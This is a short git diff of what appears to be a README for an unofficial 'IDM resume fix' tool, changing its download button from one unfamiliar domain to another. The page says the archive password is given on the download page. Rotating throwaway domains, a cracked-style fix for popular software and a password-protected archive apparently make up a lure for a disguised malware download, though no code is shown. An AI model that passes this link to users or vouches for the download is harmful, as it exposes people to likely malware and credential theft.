@@ -18,7 +18,7 @@ Fixes broken IDM download resume for expired CDN links: link refresher, cookie i
 
 ## Download
 
-[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/idmresumefix)
+[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/idmresumefix)
 
 > The archive password is shown on the download page.
 
